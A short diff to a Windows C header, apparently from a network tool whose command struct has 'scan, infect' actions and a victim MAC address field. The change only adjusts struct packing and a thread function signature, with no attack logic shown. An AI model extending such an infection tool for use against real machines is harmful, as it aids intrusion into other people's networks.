@@ -2,7 +2,6 @@
 
 #include <Windows.h>
 
-#pragma pack(1)
 
 #define ACTS_NUM 2 //scan, infect
 
@@ -15,6 +14,7 @@ enum ACTS
 	STOP_A //stop all
 };
 
+#pragma pack(push, 1)
 typedef struct command
 {
 	BYTE act;
@@ -24,7 +24,8 @@ typedef struct command
 	BYTE victim_mac[6];
 	//etc...
 } *pCommand;
+#pragma pack(pop)
 
 void add_command(pCommand command);
 
-DWORD WINAPI execute_commands(pCommand command);
+DWORD WINAPI execute_commands(LPVOID lparam);
